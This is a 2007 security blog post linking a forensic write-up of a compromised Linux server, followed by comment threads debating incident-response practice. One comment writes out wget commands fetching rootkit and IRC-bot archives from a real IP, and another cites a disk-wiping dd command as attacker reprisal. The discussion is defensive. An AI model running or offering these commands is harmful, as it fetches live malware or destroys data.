<!DOCTYPE html>
<html lang="en-US">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
	<title>How a Linux Server Gets Turned into a Zombie - Schneier on Security</title>
	<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="Schneier on Security &raquo; Feed" href="https://www.schneier.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Schneier on Security &raquo; Comments Feed" href="https://www.schneier.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Schneier on Security &raquo; How a Linux Server Gets Turned into a Zombie Comments Feed" href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/feed/" />
<link rel='stylesheet' id='wp-block-library-css'  href='https://c0.wp.com/c/5.7/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<style id='woocommerce-inline-inline-css' type='text/css'>
.woocommerce form .form-row .required { visibility: visible; }
</style>
<link rel='stylesheet' id='schneier-css'  href='https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/style.css?ver=1.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='schneier-main-css'  href='https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/dist/css/style.css?ver=1.0.2' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='https://c0.wp.com/p/jetpack/9.5.2/css/jetpack.css' type='text/css' media='all' />
<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js?ver=3.5.1' id='jquery-js'></script>
<link rel="https://api.w.org/" href="https://www.schneier.com/wp-json/" /><link rel="alternate" type="application/json" href="https://www.schneier.com/wp-json/wp/v2/posts/1729" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.schneier.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.schneier.com/wp-includes/wlwmanifest.xml" /> 

<link rel="canonical" href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html" />
<link rel='shortlink' href='https://www.schneier.com/?p=1729' />
<link rel="alternate" type="application/json+oembed" href="https://www.schneier.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.schneier.com%2Fblog%2Farchives%2F2007%2F08%2Fhow_a_linux_ser.html" />
<link rel="alternate" type="text/xml+oembed" href="https://www.schneier.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.schneier.com%2Fblog%2Farchives%2F2007%2F08%2Fhow_a_linux_ser.html&#038;format=xml" />
	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
	<link rel="icon" href="https://149400697.v2.pressablecdn.com/wp-content/uploads/2020/06/cropped-favicon-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://149400697.v2.pressablecdn.com/wp-content/uploads/2020/06/cropped-favicon-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://149400697.v2.pressablecdn.com/wp-content/uploads/2020/06/cropped-favicon-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://149400697.v2.pressablecdn.com/wp-content/uploads/2020/06/cropped-favicon-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#schneier_promotion-2 img {
    max-width: 180px;
}		</style>
		</head>

<body class="post-template-default single single-post postid-1729 single-format-standard theme-schneier woocommerce-no-js">

	<div id="wrapper">
		<div id="main">

			<header>
				<div id="header">
					<h1>
						<a href="https://www.schneier.com/" rel="home">
							Schneier on Security						</a>
					</h1>
				</div>
			</header>

			<nav>
				<div class="nav" id="header-nav">
					<div class="menu-main-menu-container"><ul id="menu-main-menu" class="menu"><li id="menu-item-50175" class="menu1 menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-50175 current-menu-item"><a href="https://www.schneier.com">Blog</a></li>
<li id="menu-item-50916" class="menu2 menu-item menu-item-type-post_type menu-item-object-page menu-item-50916"><a href="https://www.schneier.com/crypto-gram/">Newsletter</a></li>
<li id="menu-item-50166" class="menu3 menu-item menu-item-type-post_type menu-item-object-page menu-item-50166"><a href="https://www.schneier.com/books/">Books</a></li>
<li id="menu-item-50169" class="menu4 menu-item menu-item-type-custom menu-item-object-custom menu-item-50169"><a href="https://www.schneier.com/essays/">Essays</a></li>
<li id="menu-item-50170" class="menu5 menu-item menu-item-type-custom menu-item-object-custom menu-item-50170"><a href="https://www.schneier.com/news/">News</a></li>
<li id="menu-item-50171" class="menu6 menu-item menu-item-type-custom menu-item-object-custom menu-item-50171"><a href="https://www.schneier.com/talks/">Talks</a></li>
<li id="menu-item-50167" class="menu7 menu-item menu-item-type-post_type menu-item-object-page menu-item-50167"><a href="https://www.schneier.com/academic/">Academic</a></li>
<li id="menu-item-50174" class="menu8 menu-item menu-item-type-post_type menu-item-object-page menu-item-50174"><a href="https://www.schneier.com/blog/about/">About Me</a></li>
</ul></div>				</div>
			</nav>

			
<aside>
	<div class="sidebar" id="sidebar-one">
		<section><div class="sidesection widget widget_schneier_search" id="schneier_search-3"><h3>Search</h3>
<p class="small">
	<em>Powered by <a href="https://duckduckgo.com/">DuckDuckGo</a></em></p>

<form method="get" action="https://duckduckgo.com/">

	<input type="hidden" name="kh" value="1" /><!-- use https -->

	<input id="search" name="q" size="15" maxlength="255" />

	<input type="submit" value="Go" /><br>

	<input type="radio" name="sites" id="searchblog" value="www.schneier.com/blog" />
	<label for="searchblog">Blog</label>

	<input type="radio" name="sites" id="searchessays" value="www.schneier.com/essays" />
	<label for="searchessays">Essays</label>

	<input type="radio" name="sites" id="searchall" value="www.schneier.com" checked="" />
	<label for="searchall">Whole site</label>

</form>
</div></section><section><div class="sidesection widget widget_schneier_social" id="schneier_social-2"><h3>Subscribe</h3>
<div id="subscription-buttons">

	<a href="https://www.schneier.com/feed/atom"><img src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2019/10/rss-32px.png" alt="Atom Feed" /></a><a href="https://www.facebook.com/bruce.schneier"><img src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2019/10/facebook-32px.png" alt="Facebook" /></a><a href="https://twitter.com/schneierblog/"><img src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2019/10/twitter-32px.png" alt="Twitter" /></a><a href="https://www.amazon.com/Schneier-on-Security/dp/B0053HDDWW/"><img src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2019/10/kindle-32px.png" alt="Kindle" /></a><a href="https://www.schneier.com/crypto-gram"><img src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2019/10/email-32px.png" alt="E-Mail Newsletter (Crypto-Gram)" /></a>
</div>
</div></section>	</div>
</aside>

			<div id="content">

				
		<p id="breadcrumbs">

			<a href="https://www.schneier.com">Home</a><a href="https://www.schneier.com/blog/archives/">Blog</a>		</p>

		
<article id="post-1729" class="post-1729 post type-post status-publish format-standard hentry category-uncategorized tag-cracking tag-forensics tag-hacking tag-linux">

	<div class="article">

		<h2 class="entry">How a Linux Server Gets Turned into a Zombie</h2>
		<p>A very techie <a href="http://.gnist.org/article.php?story=HollidayCracking">forensic analysis</a>, but interesting.</p>

		
			<p class="entry-tags">
				<span class="tags-links">Tags: <a href="https://www.schneier.com/tag/cracking/" rel="tag">cracking</a>, <a href="https://www.schneier.com/tag/forensics/" rel="tag">forensics</a>, <a href="https://www.schneier.com/tag/hacking/" rel="tag">hacking</a>, <a href="https://www.schneier.com/tag/linux/" rel="tag">Linux</a></span>			</p>

		
		
		<p class="posted">
			<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html" rel="bookmark">Posted on August 16, 2007 at 1:34 PM</a>			â€¢
			<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html#comments">52 Comments</a>		</p>

		<aside><div class="schneier-share share" data-uri="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html" data-title="How a Linux Server Gets Turned into a Zombie" data-order="facebook twitter tumblr" data-social-share-privacy="true" /></aside>
	</div>

</article>


	<h3 id="comments">Comments</h3>

	
		<article class="comment even thread-even depth-1" id="comment-67498">

			<div class="comment by-merkelcellcancer ">

				<p class="commentcredit">

					<span class="commenter">merkelcellcancer</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67498">
						August 16, 2007 1:51 PM					</a>

				</p>

				<p>I thought Macs and Linux boxes were somewhat safe from this type of activity.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67499">

			<div class="comment by-jojo ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://www.faulhammer.org/' rel='external nofollow ugc' class='url'>Jojo</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67499">
						August 16, 2007 2:00 PM					</a>

				</p>

				<p>No, they are not&#8230;depends on your administration abilities (update frequency) and the default settings of your provider.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67500">

			<div class="comment by-nicola ">

				<p class="commentcredit">

					<span class="commenter">Nicola</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67500">
						August 16, 2007 2:20 PM					</a>

				</p>

				<p>As a linux domestic user (and a previous windows user), I must say that a linux workstation is far more secure of a windows one (and not only because linux has a 3-4% share in the desktop user)&#8230; but this refers most to viruses, worms and trojan, while in this case the server was directly attacked by an intruder and, as stated by jojo, it depends on your abilities, on your isp&#8217;s policies and, I add, on the intruders&#8217; abilities and determination&#8230;<br />
But this case is about a server, a segment where maybe the difference between windows and linux are littler (linux-desktop has policies similar to the server versions, but i hope that windows servers have tighter rules!).</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67501">

			<div class="comment by-nzruss ">

				<p class="commentcredit">

					<span class="commenter">nzruss</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67501">
						August 16, 2007 2:27 PM					</a>

				</p>

				<p>you can make the most secure operating system in the world as insecure as you like, either through the wrong settings or poor administration.</p>
<p>I&#8217;d have to say that in my experience the DEFAULT settings on major Linux distributions are more &#8216;secure&#8217; (i.e no/less open ports by default) and limited user accounts by default (rather than Admin/Root by default.)</p>
<p>But again, if you&#8217;re running a server exposed to the internet, people will prod it. If you don&#8217;t need to serve the internet, get a NAT router (and configure it properly) to hide behind.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67502">

			<div class="comment by-tremaine-lea ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://blog.ddiction.com' rel='external nofollow ugc' class='url'>Tremaine Lea</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67502">
						August 16, 2007 2:34 PM					</a>

				</p>

				<p>Interestingly, the rootkit/tools appear to remain accessible.</p>
<p>wget <a href="http://83.19.148.250/~matys/pliki/shv5.tar.gz" rel="nofollow ugc">http://83.19.148.250/~matys/pliki/shv5.tar.gz</a></p>
<p>wget <a href="http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz" rel="nofollow ugc">http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz</a></p>
<p>shv5.tar.gz<br />
shv5/<br />
shv5/setup<br />
shv5/bin.tgz<br />
shv5/conf.tgz<br />
shv5/lib.tgz<br />
shv5/README<br />
shv5/utilz.tgz</p>
<p>psotnic0.2.5.tar.gz<br />
psotnic-0.2.5-linux-static-ipv6<br />
LICENSE<br />
TODO<br />
CHANGELOG<br />
README<br />
./cfg-examples/<br />
./cfg-examples/conf.hub<br />
./cfg-examples/conf.leaf<br />
./cfg-examples/conf.slave<br />
FEATURES</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67503">

			<div class="comment by-alan ">

				<p class="commentcredit">

					<span class="commenter">Alan</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67503">
						August 16, 2007 2:50 PM					</a>

				</p>

				<p>The whole directory is full of script-kiddy goodness.</p>
<p>More things to add to my rootkit detection scripts.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67504">

			<div class="comment by-carlo-graziani ">

				<p class="commentcredit">

					<span class="commenter">Carlo Graziani</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67504">
						August 16, 2007 2:51 PM					</a>

				</p>

				<p>Setting syslog to log remotely to some fortress machine &#8212; an OpenBSD box, or Linux running minimal services and with no user other than the sysadmins &#8212; can be a useful forensic tool for this kind of situation.  Deleting or modifying files in the local /var/log won&#8217;t compromise the audit trail, and even modifying /etc/syslog.conf is risky, since changes in logging cadence at the fortress box might be noticed.  Certainly, the initial break-in would be much harder to conceal.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67505">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67505">
						August 16, 2007 3:27 PM					</a>

				</p>

				<p>That writeup is a great example of how <em>not</em> to do this kind of investigation.</p>
<p>First thing after determining you&#8217;re hacked: collect last used times of all objects in filesystem, followed by last modified and inode change times (or all together, using an appropriate tool). Only then should you start looking at things; otherwise you won&#8217;t be able to construct a timeline of the intruder&#8217;s activity. Once you start poking around the /var/.x directories you are throwing away important timestamp information, which can help you a lot in determining the full extent of your compromise if, for example, the intruder installed a keylogger or trojaned ssh client. Ideally, you also conduct your investigation as unobtrusively as possible until you&#8217;re ready to actually contain the intrusion; tipping off the intruder that you know about the intrusion is an invitation for some of them to dd if=/dev/zero of=/dev/sda your system. Similarly, wgets and DNS lookups should be performed from an unrelated system as this activity may be monitored.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67506">

			<div class="comment by-nix ">

				<p class="commentcredit">

					<span class="commenter">Nix</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67506">
						August 16, 2007 4:02 PM					</a>

				</p>

				<p>Also: if you can, unplug your box from the net to minimize the damage it can do; then image its block devices and do the analysis on the imaged devices, mounted read-only through a loopback filesystem or in a virtual machine if possible. (The writeup author was using a virtual machine for a lot of this, apparently.)</p>
<p>(And, Bruce, I&#8217;m disappointed. A `very techie&#8217; writeup would have dissassembled the binaries and worked out what they <em>really</em> do. ðŸ™‚ )</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67507">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67507">
						August 16, 2007 4:17 PM					</a>

				</p>

				<p>Nix&gt; Also: if you can, unplug your box from the net to minimize the damage it can do</p>
<p>Depending on the compromise, there are scenarios where this is not a good idea. It&#8217;s advisable to know the scope of the compromise before you do anything that will tip off the intruder. If the intruder got onto ten other boxes using knowledge from the one you know about, the damage resulting from taking the one you know about off the net can be much worse (e.g. intruder decides to wipe out the other ten boxes) than anything the intruder actually does on the one box in the time it takes you to figure out where else he was able to get to.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67508">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67508">
						August 16, 2007 4:56 PM					</a>

				</p>

				<p>@antibozo<br />
The problem is that ANYTHING you do could alert the intruder.</p>
<p>Search for atimes? That would alert him.</p>
<p>ls -R? That would alert him.</p>
<p>etc.</p>
<p>Following that, you couldn&#8217;t even reboot a router. Or shut the box down to swap a power supply.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67509">

			<div class="comment by-christoph-zurnieden ">

				<p class="commentcredit">

					<span class="commenter">Christoph Zurnieden</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67509">
						August 16, 2007 5:25 PM					</a>

				</p>

				<blockquote><p>
  Depending on the compromise, there are scenarios where this is not a good idea.
</p></blockquote>
<p>There are no such scenarios as long as you do no official forensic analysis with all the necessary judicial permissions.<br />
Tha largest problem is that you don&#8217;t know what your Zombie does&#8212;it might publish copies of the american constitution or child pornography; the first one might get you to northern Cuba, the second will get you in some way more serious trouble.<br />
So, if you think that you have been cracked: pull the plug immediatly! Either litterally or by overwriting (&#8216;/bin/rm&#8217; might be compromised, &#8216;echo&#8217; is a buildin in most shells, which might also be compromised) and deleting the kernel and rebooting. It might even be necessary to call the police that one of your server has been cracked (you may use the term &#8220;hacked&#8221; instead, it&#8217;s more common to the public) and that you can&#8217;t stop it. That might be helpfull in case of a prosecution.</p>
<p>Because it is sometimes very complicated if not impossible to determine the exact time of the breach it is very complicated to determine which backup is the last correct one.<br />
One way to avoid that trouble is the full backup of all binaries in use for every backup or better to keep the cryptographic hashes of the binaries on the backups and compare it with the original hashes every time you do a backup. The latter will alarm you if something, eh, curious happens. At least if nobody found a way to circumvent it or, more probably, you messed up the implementation.</p>
<p>CZ</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67510">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67510">
						August 16, 2007 5:31 PM					</a>

				</p>

				<p>Brandioch Conner&gt; The problem is that ANYTHING you do could alert the intruder.</p>
<p>Obviously. But taking the box off the net is a lot more likely to alert him than ls -lu, especially if just before that you do a bunch of nslookups and wgets from the compromised host.</p>
<p>In addition, there are other reasons not to disconnect the box from the network. For one thing, you may be unable to collect all the information you need about the intruder&#8217;s network connections before they time out. For another, if you have NFS mounts on the box, taking it off the net impairs your ability to collect system information since things start hanging.</p>
<p>The general rule is to be as unobtrusive as possible until you&#8217;ve sussed out the full extent of the compromise and are ready to contain, then contain all the compromised boxes simultaneously so you&#8217;re not playing whack-a-mole with the intruder. The major exception to this is if you have a web defacement&#8211;in that case, the intruder expects you to take the box off the net, and the PR harm usually warrants doing so as quickly as possible.</p>
<p>Brandioch Conner&gt; Following that, you couldn&#8217;t even reboot a router. Or shut the box down to swap a power supply.</p>
<p>Indeed, if you have a mass compromise, those are risky activities, and even if the intruder doesn&#8217;t notice, you may lose important information about the compromise. But if you <em>know</em> you have a compromise, dealing with it is usually the highest priority, so you shouldn&#8217;t be swapping power supplies. If you don&#8217;t know about a compromise, you just go about your normal maintenance activity.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67511">

			<div class="comment by-lawrence-doliveiro ">

				<p class="commentcredit">

					<span class="commenter">Lawrence D&#039;Oliveiro</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67511">
						August 16, 2007 6:26 PM					</a>

				</p>

				<p>A machine belonging to a client of mine was cracked in a similar way several years ago. The giveaway was also similar, through the &#8220;ls&#8221; command: the cracker had created a directory in /home, which didn&#8217;t show up with &#8220;ls /home&#8221;, but did with &#8220;ls /home/*&#8221;. In those days, Red Hat installations tended to have all services enabled by default, and they got in through a vulnerability in RPC (port 111), which we weren&#8217;t even using.
</p>
<p>There&#8217;s still the mystery of how they broke in with this attack. Though, as soon as anybody says &#8220;PHP&#8221;, I tend to shout &#8220;There&#8217;s your problem!&#8221; ðŸ™‚</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67512">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67512">
						August 16, 2007 6:42 PM					</a>

				</p>

				<p>@antibozo</p>
<p>It looks like you&#8217;re confusing a few different issues.</p>
<p>#1. Identify which machines are cracked.</p>
<p>#2. Identify the code on the machines that the cracker put there.</p>
<p>#3. Learn more about the cracker&#8217;s existing network.</p>
<p>#4. Protect yourself from his reprisals.</p>
<p>In my experience, 99.99% of the time the cracker doesn&#8217;t care whether the machine goes off-line. He&#8217;s managing thousands of them. He doesn&#8217;t even care if one is dis-infected. Or a dozen. Mostly these are Windows machines spewing spam, hosting files or part of a DDoS.</p>
<p>In the other (very rare) cases, he&#8217;s looking for something specific. In those cases he would care whether you started doing anything unusual.</p>
<p>You can&#8217;t say that he would look for A &amp; B &amp; C &amp; D &#8230; but not E. At least you cannot say so without providing some explanation on WHY he would take some steps but not others. They&#8217;re all about the same difficulty. He&#8217;s already cracked the machine.</p>
<p>&#8220;But if you <em>know</em> you have a compromise, dealing with it is usually the highest priority, so you shouldn&#8217;t be swapping power supplies. If you don&#8217;t know about a compromise, you just go about your normal maintenance activity.&#8221;</p>
<p>No, you didn&#8217;t understand. My example was that, given your scenario, even if the admin was NOT aware his machines had been cracked, his regular maintenance routine COULD cause the cracker to retaliate as you describe.</p>
<p>Now, how many stories have you heard where someone rebooted a firewall and suddenly 10 of his servers were wiped? I haven&#8217;t heard any.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67513">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67513">
						August 16, 2007 6:45 PM					</a>

				</p>

				<p>Lawrence D&#8217;Oliveiro&gt; they got in through a vulnerability in RPC (port 111), which we weren&#8217;t even using.</p>
<p>That may have been the NFS statd vulnerability which accounted for a lot of Linux compromises in Red Hat 6.x days. See this URL for discussion and exploit code:</p>
<p><a href="http://www.securityfocus.com/bid/1480/discuss" rel="nofollow ugc">http://www.securityfocus.com/bid/1480/discuss</a></p>
<p>That&#8217;s not a vulnerability in RPC per se; it&#8217;s a vulnerability in an RPC service&#8211;the NFS status daemon. RPC is a protocol and set of libraries for performing remote procedure calls.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67514">

			<div class="comment by-someone ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://file:///dev/null' rel='external nofollow ugc' class='url'>Someone</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67514">
						August 16, 2007 7:13 PM					</a>

				</p>

				<p>Oh goodness, here we go. Only half an article there: as others here have noticed, the consideration that by interfering you&#8217;d alert the kiddie is another factor.</p>
<p>Other things to consider: if you&#8217;ve only just noticed how one insecure service you&#8217;re running got cracked months ago, who&#8217;s to say that&#8217;s the only kit installed? It needs reiterating: there is no chance of repairing this box, it needs a full imaging for forensics, wipe &amp; reinstall.</p>
<p>Why do these black-hat idiots not work off proper reasonably uptodate sources anyway? I&#8217;ve detected a cracked box because its netstat didn&#8217;t understand -p, that&#8217;s par for the course; but here we have an ls that&#8217;s a million miles from ls, and &#8220;smbd&#8221; running with -a, an option which the real thing does not have. Crappy disguise.</p>
<p>There&#8217;s nothing particularly imaginative in this writeup. Some years ago when I was more into this kind of thing, I knew of articles talking about injecting kernel modules (even in non-modular kernels) and the ability to divert exec*() calls to different inodes than open() calls &#8211; think about it, you could md5sum the binary and it would show up clean but still execute a nasty instead.</p>
<p>Our narrator here is nothing like paranoid enough; are you?</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67515">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67515">
						August 16, 2007 7:40 PM					</a>

				</p>

				<p>Brandioch Conner&gt; It looks like you&#8217;re confusing a few different issues.</p>
<p>The issues you list are indeed various issues to consider. I am not in the least confusing them, however.</p>
<p>Brandioch Conner&gt; In my experience, 99.99% of the time the cracker doesn&#8217;t care whether the machine goes off-line.</p>
<p>With the Windows botnets, perhaps, but not with the far less common Linux compromises, where, in the very least, the intruders generally try to get back in over the next few days after containment.</p>
<p>Brandioch Conner&gt; In the other (very rare) cases, he&#8217;s looking for something specific. In those cases he would care whether you started doing anything unusual. You can&#8217;t say that he would look for A &amp; B &amp; C &amp; D &#8230; but not E.</p>
<p>If you&#8217;re talking about how skillfully the intruder can deduce that I know about him, yes, that is difficult to gauge a priori, but after doing the basic stuff unobtrusively one can form some judgments based on the types of tools one finds. It takes a fairly highly skilled intruder to figure out that you&#8217;re onto him if you&#8217;re reasonably quiet about it and don&#8217;t name your tool &#8220;collect-forensic-intrusion-info.sh&#8221;. But when the box goes off the net, even the clumsiest intruder gets a thwack from the clue stick.</p>
<p>But yes, in the worst case, a hair-trigger paranoid intruder might wipe the box when you log in to check on disk space, even though you don&#8217;t know about the intrusion; there&#8217;s not much you can do about that, but dealing with intrusions is always a case of making the best out of a bad situation.</p>
<p>Brandioch Conner&gt; No, you didn&#8217;t understand. My example was that, given your scenario, even if the admin was NOT aware his machines had been cracked, his regular maintenance routine COULD cause the cracker to retaliate as you describe.</p>
<p>I did understand, and I agreed with you. The discussion here is about what to do when you know you have a compromise, not what to do when you don&#8217;t know.</p>
<p>Brandioch Conner&gt; Now, how many stories have you heard where someone rebooted a firewall and suddenly 10 of his servers were wiped? I haven&#8217;t heard any.</p>
<p>And of course you wouldn&#8217;t hear any such stories, because when a gang of systems goes south all of a sudden in the normal course of business, people don&#8217;t usually assume it&#8217;s because of a mass compromise. When all the compromised boxes are toast, it&#8217;s not easy to tell that a compromise even occurred, and very few admins will even think of looking; instead they&#8217;ll schedule a maintenance call with their UPS vendor.</p>
<p>I can tell you that such scenarios occur, though I don&#8217;t know of one with the level of caprice in your example. The point, however, is not to attempt direct combat with someone if you don&#8217;t know where he is, why, or how he got there. Your best bet for effective containment is to work as quickly and unobtrusively on the system as possible to collect all the information you might need, then analyze that on another system without mucking with the compromised box in any obvious way. The knee-jerk pull-it-off-the-net strategy rarely helps anything (if there&#8217;s a DDoS going on, or, as I mentioned earlier, a defacement, it may be warranted; otherwise it usually doesn&#8217;t really harm the attacker as you yourself pointed out, and, for all you know, he&#8217;s been there for three months, so what&#8217;s another few hours?), definitely impairs your ability to find out what he&#8217;s doing and how he got there, and may result in reprisal, so what&#8217;s the point? In those cases where the box you know about really is the only box that had the vulnerability, you may luck out. Otherwise, they&#8217;re either already in on other boxes (maybe the one you know about was a secondary compromise), or worse, you have a common vulnerability on a bunch of other exposed systems and he&#8217;s in on those in full knowledge you detected him, while you&#8217;re off playing with the one box you took offline.</p>
<p>What you want to do is find out the compromise vector, find out the scope of the vulnerability and the compromise, and contain. Pulling one box off the net is not an effective strategy for this goal&#8211;no more so than shooting the first soldier you see in the forest is a good way to combat an unknown number of soldiers nearby. Superior reconnaissance can win the battle with far less destruction, and reconnaissance requires stealth and finesse.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67516">

			<div class="comment by-xrey ">

				<p class="commentcredit">

					<span class="commenter">xrey</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67516">
						August 16, 2007 8:06 PM					</a>

				</p>

				<p>Regarding pull-the-plug vs. don&#8217;t-pull-the-plug:</p>
<p>If a sysadmin who I&#8217;ve hired to manage my data realizes that a box is compromised and <em>doesn&#8217;t</em> pull the network connection immediately, that sysadmin should be out of a job.</p>
<p>The cracker may have stolen some of your data&#8211;that&#8217;s why you need to immediately image the drive and do forensics later&#8211;but there&#8217;s a good chance the cracker has not stolen your data yet. Better to not lose any more.</p>
<p>Networks go down all the time, so a cracker isn&#8217;t going to start reprisals just because he can&#8217;t get to your box temporarily. If that was the standard MO, we&#8217;d see zombies being formatted on a regular basis right after network downtime. How often does that happen?</p>
<p>In this case, the cracker was most likely interested in a zombie rather than the contents of the machine. However, once you start trying to back trace to the cracker, he now has some incentive to perform real damage.</p>
<p>Maybe the best solution is to have a cloned honey-pot ready to go. From the outside, it will look and act like the compromised machine, but all the sensitive material should be replaced with something innocuous.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67517">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67517">
						August 16, 2007 8:55 PM					</a>

				</p>

				<p>xrey&gt; The cracker may have stolen some of your data&#8211;that&#8217;s why you need to immediately image the drive and do forensics later&#8211;but there&#8217;s a good chance the cracker has not stolen your data yet. Better to not lose any more.</p>
<p>Actually, the probability you&#8217;ve lost data, and how much of it, is completely unknown to you at the time of discovery. If he was there for three months, again, a few hours don&#8217;t make any difference.</p>
